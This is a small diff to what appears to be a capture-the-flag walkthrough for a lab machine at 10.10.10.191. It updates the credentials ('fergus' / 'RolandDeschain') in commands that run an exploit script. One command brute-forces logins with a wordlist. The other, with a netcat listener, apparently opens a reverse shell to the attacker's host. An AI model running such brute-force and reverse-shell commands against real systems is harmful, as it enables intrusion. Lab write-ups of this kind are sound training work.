@@ -39,7 +39,7 @@ Local Network:
 
 ```
 
-$ ./exploit.py -r 10.10.10.191 -u admin -w wordlist -b
+$ ./exploit.py -r 10.10.10.191 -u fergus -w wordlist -b
 
 ```
 
@@ -52,6 +52,6 @@ $ nc -nvlp 4443
 
 ```
 
-$ ./exploit.py -r 10.10.10.191 -u admin -p admin -l 10.10.16.16 -lp 4443
+$ ./exploit.py -r 10.10.10.191 -u fergus -p RolandDeschain -l 10.10.16.16 -lp 4443
 
 ```
